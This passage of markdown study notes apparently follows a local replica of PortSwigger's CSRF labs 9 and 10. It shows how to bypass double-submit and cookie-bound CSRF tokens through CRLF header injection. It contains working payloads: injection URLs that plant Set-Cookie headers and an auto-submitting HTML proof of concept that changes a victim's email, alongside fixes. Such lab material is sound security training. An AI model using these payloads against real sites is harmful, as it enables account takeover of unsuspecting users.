     │                     Validates:│ csrfKey=ATTACKER matches
     │                               │ csrf=ATTACKER_TOKEN → ✅
     │◀── email changed ─────────────│
```

---

### Key Takeaway

> Tying CSRF tokens to a **non-session** cookie doesn't solve the problem — it just moves the attack. If the attacker can control the `csrfKey` cookie (via any cookie-injection vulnerability), they can bypass the protection. **CSRF tokens must be tied to the session itself**, not a separate cookie.

---

### Quick Reference — Lab 9

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/8` |
| CRLF injection point | `GET /lab/csrf-cookie/search?q=...CRLF...Set-Cookie:...` |
| Attacker's csrfKey | `attacker_csrfKey_xyz789` |
| Attacker's csrf token | `attacker_csrf_UYjqwyyGyrsnr8qG` |
| Attack phases | 1) Inject csrfKey cookie  2) Submit forged form |
| Trigger method | `<img onerror="form.submit()">` |
| Fix | Tie CSRF token to the session, not a separate cookie |

---

*Continue to [Lab 10 — CSRF Where Token Is Duplicated in Cookie (Double Submit)](#lab-10--csrf-where-token-is-duplicated-in-cookie-double-submit)*

---

## Lab 10 — CSRF Where Token Is Duplicated in Cookie (Double Submit)

> **PortSwigger equivalent:** Lab: CSRF where token is duplicated in cookie

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/csrf-double` |
| **Goal** | Use the exploit server to host HTML that uses CSRF to change the viewer's email address |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

This application uses the **Double Submit Cookie** pattern for CSRF protection:
- The server generates a random value and sets it as **both** a cookie AND a hidden form field
- On submission, it checks that the cookie value and form field value **match each other**
- There is **no server-side state** — the server doesn't store the token

This seems secure because an attacker on another domain can't read cookies. BUT — if the attacker can **set** the csrf cookie via any injection vulnerability, they can control both sides of the comparison.

> **Simple analogy:** A bank checks that the signature on your cheque matches the one on your ID card. But if the attacker can forge your ID card (cookie injection), they can sign cheques that match.

---

### The Double Submit Pattern — How It's Supposed to Work

```
Server generates:  random_value = "xK9mNpQr"

Response:
  Set-Cookie: csrf=xK9mNpQr          ← sets cookie
  HTML: <input type="hidden" name="csrf" value="xK9mNpQr">  ← sets form field

On submission server checks:
  req.body.csrf === req.cookies.csrf
  "xK9mNpQr"  ===  "xK9mNpQr"   → ✅ match!
```

**Why it's supposed to work:** An attacker on evil.com cannot read the victim's csrf cookie (SOP blocks cross-site reads), so they can't know the value to put in the form field.

**Why it fails here:** The attacker doesn't need to READ the cookie — they can **WRITE** their own value via the CRLF injection vulnerability in the search endpoint.

---

### The Vulnerability

Same CRLF injection point as Lab 9:

```
GET /?search=test%0d%0aSet-Cookie:%20csrf=attacker_val%3b%20SameSite=None
```

This sets `csrf=attacker_val` in the victim's browser. Now the attacker controls both:
- The cookie: `csrf=attacker_val`
- The form field: `csrf=attacker_val`

Server check: `"attacker_val" === "attacker_val"` → ✅ **match — allowed!**

---

### The Intercepted HTTP Request

```http
POST /email/change/8 HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123;
        csrf=attacker_val               ← attacker injected this!
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=attacker_val   ← matches the injected cookie
```

Server validation:
```
req.body.csrf   === req.cookies.csrf
"attacker_val"  ===  "attacker_val"    → MATCH ✅
Result: ALLOWED (attacker chose both sides!)
```

---

### CSRF Vulnerability Analysis — 3 Conditions

Before exploiting, confirm all three conditions are met:

| Condition | Status | Why |
|---|---|---|
| Relevant action | ✅ | Email change → attacker can trigger password reset → full account takeover |
| Cookie-based session | ✅ | Only `session` cookie identifies the user, attached automatically |
| No unpredictable params | ✅ | Both `email` and `csrf` values are chosen/controlled by the attacker |

---

### CSRF Token Testing Methodology

When you encounter a CSRF token, test it systematically:

**Phase 1 — Testing the CSRF token alone:**

| Test | Action | Result tells you |
|---|---|---|
| 1 | Remove the `csrf` parameter entirely | If accepted → bypass 3 (token only checked when present) |
| 2 | Change request method POST → GET | If accepted → bypass 2 (token only checked on POST) |
| 3 | Submit with wrong token value | If blocked → token IS validated |
| 4 | Submit valid token from another user | If accepted → bypass 4 (not session-bound) |

**Phase 2 — Testing CSRF token + CSRF cookie:**

| Test | Action | Result tells you |
|---|---|---|
| 5 | Submit invalid `csrf` + valid `csrfKey` cookie | If blocked → token is tied to cookie |
| 6 | Submit valid `csrf` from another user's session | If accepted → double-submit pattern (this lab!) |
| 7 | Submit valid `csrf` + `csrfKey` both from another user | If accepted → this is Lab 9 (non-session cookie) |

**For this lab (Lab 10), test #6 reveals the flaw:**
- Send the email change request to Burp Repeater
- Change the `csrf` body param to any value AND change the `csrf` cookie to the SAME value
- Server accepts it — proving it just checks `body.csrf === cookie.csrf` with no server-side state

---

### How to Exploit — Two Things Required

In order to exploit this vulnerability, you need to do **two things**:

```
1. Inject a csrf cookie into the victim's browser  (HTTP Header Injection / CRLF)
2. Send a CSRF form with a csrf value matching that injected cookie
```

Both of these are done together using the `<img onerror=submit>` pattern.

---

### Discovering the CRLF Injection Point

**What is CRLF Injection?**
CRLF = Carriage Return (`\r` = `%0d`) + Line Feed (`\n` = `%0a`). HTTP headers are separated by CRLF. If a server reflects user input directly into a response header, injecting CRLF lets you add new headers.

**Test the search endpoint:**

```
GET /lab/csrf-double/search?q=test HTTP/1.1
```
Response:
```
HTTP/1.1 200 OK
Set-Cookie: lastSearch=test      ← search term reflected in Set-Cookie!
```

**Inject a new header using CRLF:**

```
GET /lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=hacked%3b%20SameSite=None
```

URL decoded:
```
q=test\r\nSet-Cookie: csrf=hacked; SameSite=None
```

Response:
```
HTTP/1.1 200 OK
Set-Cookie: lastSearch=test
Set-Cookie: csrf=hacked; SameSite=None     ← injected!
```

The victim's browser now has `csrf=hacked` stored as a cookie.

> **Why `SameSite=None`?** Without it, the injected cookie might be subject to SameSite restrictions. Setting `SameSite=None` ensures the cookie is sent with cross-site requests.

---

### Step-by-Step Solution

**Step 1 — Log in and capture the email change request**

1. Open `http://localhost:3000/lab/csrf-double`
2. Type a new email in the form and click **Update email**
3. The **Request Inspector** shows:
   - `Cookie: csrf=csrf_double_xK9mNpQr2sLt`
   - `Body: email=...&csrf=csrf_double_xK9mNpQr2sLt`
4. Note: the cookie value and body value are **identical** — double-submit pattern!

**Step 2 — Confirm the validation logic**

Send the request in Burp Repeater (or observe via Token Inspector):
- Change `csrf` body param to `fake`, keep cookie as original → **Blocked** (mismatch)
- Change BOTH `csrf` body AND `csrf` cookie to `fake` → **Accepted** ✅
- This proves: server only checks `body.csrf === cookie.csrf`, no server-side state

**Step 3 — Test the CRLF injection in the search endpoint**

Visit:
```
http://localhost:3000/lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

Check your browser's cookies — `csrf=fake` should now be set.

Now submit the email form with `csrf=fake` in the body → **Accepted!**
The bypass works.

**Step 4 — Create the exploit URL for cookie injection**

```
http://localhost:3000/lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

Decoded:
```
q = test
    \r\n
    Set-Cookie: csrf=fake; SameSite=None
```

This URL, when loaded by the victim's browser, plants `csrf=fake` as a cookie.

**Step 5 — Build the full PoC**

Click **"Generate PoC ▼"** in the lab, or build manually:

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <form action="http://localhost:3000/email/change/8" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
            <input type="hidden" name="csrf"  value="fake">
        </form>

        <img src="http://localhost:3000/lab/csrf-double/search?q=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
             onerror="document.forms[0].submit()">
    </body>
</html>
```

**Line-by-line breakdown:**

```
<h1>Hello World!</h1>
  → Decoy content — victim sees something normal

<form action=".../email/change/8" method="POST">
  → The forged email change request

<input name="email" value="attacker@evil.com">
  → The attacker's target email

<input name="csrf" value="fake">
  → The csrf body value — matches whatever we inject as cookie

<img src=".../search?q=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
  → Loading this URL plants csrf=fake as a cookie in victim's browser
     (the CRLF injection)

onerror="document.forms[0].submit()"
  → The <img> always fails (404 = image not found)
  → onerror fires AFTER the cookie is set
  → Form submits with csrf=fake in body
  → Browser sends Cookie: csrf=fake (just injected)
  → Server: "fake" === "fake" → MATCH → ALLOWED ✅
```

> **Why `onerror` instead of `onload`?**
> The search endpoint returns a 200 HTML page, not an image — so the browser fires `onerror` (image failed to load), not `onload`. `onerror` fires after the response is received, so the Set-Cookie header has already been processed by the time the form submits.

**Step 6 — Important: change the email value**

> ⚠️ **Hint from PortSwigger:** You cannot register an email address already taken by another user. Test the exploit with `test1@test.ca`, then change to a **different** email before delivering to the victim.

**Step 7 — Store and deliver**

1. Click **⚡ Send to Exploit Server** (or paste into exploit editor manually)
2. Click **Store**
3. Click **"View exploit"** first to verify it works on yourself
4. Check Request Inspector — should show double-submit bypass with your injected value
5. Change email to a value different from your own test email
6. Click **Deliver exploit to victim**
7. **"🎉 Lab Solved!"** banner appears

---

### Behind the Scenes — Full Attack Flow

```
Victim browser                   localhost:3000
     │                                 │
     │  load exploit page              │
     │                                 │
     │─── GET /search?q=test           │
     │    %0d%0aSet-Cookie:            │
     │    csrf=fake;SameSite=None ────▶│
     │                                 │ Response includes:
     │◀── Set-Cookie: csrf=fake ───────│ (CRLF injected header)
     │                                 │
     │  <img> onerror fires            │
     │  (image didn't load = 404/HTML) │
     │                                 │
     │─── POST /email/change/8 ───────▶│
     │    Cookie: session=victim123    │
     │    Cookie: csrf=fake            │ ← injected by attacker
     │    Body:   csrf=fake            │ ← attacker put in form
     │            email=attacker@evil  │
     │                                 │
     │                     Validates:  │ body.csrf === cookie.csrf
     │                                 │ "fake" === "fake" → ✅ MATCH
     │◀── email changed ───────────────│
```

---

### Why The Attack Works — Root Cause

```
The Double Submit Cookie pattern assumes:
  "Attacker cannot know the csrf cookie value (SOP blocks reads)"

But this lab has CRLF injection which allows:
  "Attacker can SET the csrf cookie to any value they choose"

Attacker's logic:
  I don't need to READ your token.
  I'll REPLACE your token with my own value.
  Then I'll use my own value in the form.
  Server just checks they match → match!
```

The fundamental flaw: **any vulnerability that allows setting cookies completely breaks the Double Submit pattern.**

---

### The Real Fix

```javascript
// ❌ WRONG — Double Submit (vulnerable when attacker can set cookies):
if (req.body.csrf !== req.cookies.csrf) { reject(); }

// ✅ CORRECT — Server-side session-bound token:
if (req.body.csrf !== req.session.csrfToken) { reject(); }
// Token generated at login, stored in session, validated from session.
// Attacker cannot set req.session.csrfToken — that's server-side.
```

**The fix in one sentence:** Store the CSRF token **server-side in the session**, not in a cookie the attacker can overwrite.

---

### Comparison: Lab 9 vs Lab 10

| | Lab 9 (non-session cookie) | Lab 10 (double submit) |
|---|---|---|
| What's validated | csrf token against csrfKey cookie | csrf field against csrf cookie |
| What attacker injects | csrfKey cookie | csrf cookie |
| Attacker's token needed | Yes (own account's token) | No (any value works) |
| Server-side state | None | None |
| Both exploited via | CRLF injection in search | CRLF injection in search |

---

### The Real Fix for Double Submit

```javascript
// WRONG — stateless double submit (vulnerable):
if (req.body.csrf === req.cookies.csrf) { allow(); }

// CORRECT — server-side state (secure):
if (req.body.csrf !== req.session.csrfToken) { reject(); }
//  ^ token stored in session at generation, validated from session on submit
```

The double-submit pattern is only safe if the attacker **cannot set cookies** on the target domain. With any cookie-injection vulnerability present, it breaks completely.

---

### Key Takeaway

> The Double Submit Cookie pattern is fragile. It relies on the attacker being unable to set cookies — but CRLF injection, subdomain XSS, or any other cookie-setting vulnerability destroys this assumption. **Always use server-side session-bound CSRF tokens** as the primary defense.

---

### Quick Reference — Lab 10

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/9` |
| CRLF injection point | `GET /lab/csrf-double/search?q=...CRLF...Set-Cookie:...` |
| Attacker-chosen value | `hacked` (any value works — attacker controls both sides) |
| Server validation | `req.body.csrf === req.cookies.csrf` |
| Why it fails | Attacker injects csrf cookie = controls both sides of comparison |
| Fix | Use server-side session-bound token, not stateless double-submit |

---

## Updated All Labs — Summary Table

| Lab | Difficulty | Defence | Bypass | Key Trick |
|---|---|---|---|---|
| 1 | APPRENTICE | None | N/A | Basic auto-submit POST form |
| 2 | PRACTITIONER | Token on POST only | Switch to GET | `document.location` navigation |
| 3 | PRACTITIONER | Token when present | Remove token param | Omit `csrf=` field entirely |
| 4 | PRACTITIONER | Token (global pool) | Use own token | Attacker's token valid for any session |
| 5 | PRACTITIONER | SameSite=Lax | GET endpoint exists | `document.location` = top-level GET nav |
| 6 | PRACTITIONER | Referer check | Suppress Referer | `<meta name="referrer" content="never">` |
| 7 | PRACTITIONER | SameSite=Lax (default) | Method override | GET + `_method=POST` query param |
| 8 | PRACTITIONER | SameSite=Strict | Client-side redirect | On-site redirect gadget + path traversal GET |
| 9 | PRACTITIONER | Token + csrfKey cookie | Inject csrfKey via CRLF | `<img onerror=submit>` + CRLF injection |
| 10 | PRACTITIONER | Double Submit Cookie | Inject csrf cookie | CRLF injection → control both sides |

---

*Notes based on PortSwigger Web Security Academy — https://portswigger.net/web-security/csrf*
*Local labs: `cd Client/CSRF/LabApp && npm start` → http://localhost:3000*
